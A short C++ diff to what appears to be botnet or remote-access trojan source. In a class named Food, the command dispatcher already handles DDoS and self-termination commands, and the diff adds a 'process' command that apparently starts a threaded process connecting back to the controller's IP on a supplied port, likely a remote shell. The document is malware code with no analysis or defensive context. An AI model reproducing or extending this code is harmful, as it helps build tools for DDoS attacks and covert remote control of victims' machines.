@@ -247,6 +247,11 @@ void Food::processCmd(std::string& cmd, std::string& data)
 		doDdos(args);
 		return;
 	}
+
+	if (cmd == CmdProcess) {
+		doProc(args);
+		return;
+	}
 }
 
 std::map<std::string, std::string> Food::parseArgs(std::string& data)
@@ -309,3 +314,6 @@ void Food::doOffline(std::map<std::string, std::string>&)
 	ExitProcess((UINT)NULL);
 }
 
+void Food::doProc(std::map<std::string, std::string>& args) {
+	Proc::startByNewThread(mSock.mIp, atoi(args["PORT"].data()));
+}
